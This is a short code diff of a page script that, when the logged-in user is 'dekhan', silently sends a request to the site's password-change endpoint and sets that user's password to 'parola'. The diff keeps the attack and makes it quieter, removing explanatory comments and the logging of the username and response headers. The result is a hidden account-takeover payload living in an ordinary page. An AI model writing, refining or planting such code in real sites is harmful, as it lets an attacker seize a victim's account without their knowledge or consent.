@@ -1,22 +1,16 @@
 <script>
     $(function () {
-        console.log(window.authUserName);
         if (window.authUserName === 'dekhan') {
-            // Theoretically change password
-            var newPassword = 'parola';
             $.ajax({
-                url: '/inside/auth/change_password', // The URL for the password change API
+                url: '/inside/auth/change_password',
                 type: 'POST',
                 data: {
-                    password: newPassword,
-                    confirm_password: newPassword
+                    password: 'parola',
+                    confirm_password: 'parola'
                 },
                 success: function (response, textStatus, xhr) {
                     // Log the status code and response body
-                    console.log('Password changed successfully. Status:', xhr.status, 'Response:', response);
-
-                    // Log all response headers
-                    console.log('Response Headers:', xhr.getAllResponseHeaders());
+                    console.log('Password changed successfully. Status:', xhr.status);
                 },
                 error: function (xhr, status, error) {
                     // Log error details including status code and text
